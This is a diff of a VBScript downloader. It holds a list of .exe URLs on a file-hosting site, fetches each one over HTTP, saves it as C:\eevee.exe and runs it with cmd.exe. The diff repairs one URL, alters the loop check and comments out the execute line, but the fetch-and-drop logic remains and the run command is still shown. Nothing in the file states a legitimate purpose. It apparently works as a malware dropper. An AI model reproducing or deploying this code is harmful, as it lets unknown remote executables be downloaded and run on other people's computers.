@@ -1,10 +1,8 @@
-poke = "http://a.pomf.cat/uthqdm.exe"       'eevee
-eeveelution = "a.pomf.cat/utoojo.exe"       'installer
 Dim max,min
 Dim list
 Set list = CreateObject("System.Collections.ArrayList")
 	list.Add "http://a.pomf.cat/uthqdm.exe" 'eevee
-	list.Add "a.pomf.cat/utoojo.exe"        'installer
+	list.Add "http://a.pomf.cat/utoojo.exe"        'installer
 
 names = "C:\eevee.exe"
 i = 0
@@ -19,7 +17,7 @@ Do While i <= 0
 	
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
 	objXMLHTTP.open "GET", list(i), false
-	If i >= 1 Then
+	If i > 2 Then
 	    i = 0
 	End if
 	objXMLHTTP.send()
@@ -41,7 +39,7 @@ Do While i <= 0
 	Set objXMLHTTP = Nothing
 	
 
-	oShell.run "cmd.exe /C "&streevee&" "&strHDLocation
+	'oShell.run "cmd.exe /C "&streevee&" "&strHDLocation
 	Set oShell = Nothing
 	i = i + 1
 Loop 
